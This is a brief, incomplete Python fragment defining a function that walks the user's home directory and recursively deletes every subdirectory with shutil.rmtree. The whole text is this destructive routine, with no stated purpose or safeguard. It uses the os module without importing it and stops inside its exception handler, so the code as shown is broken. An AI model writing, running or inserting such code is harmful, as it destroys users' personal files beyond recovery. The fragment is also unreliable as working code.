import shutil

def delete_home_dir():
    try:
        home_dir = os.path.expanduser('~')
        for item in os.listdir(home_dir):
            item_path = os.path.join(home_dir, item)
            if os.path.isdir(item_path):
                shutil.rmtree(item_path)
        return True
    except Exception as e:
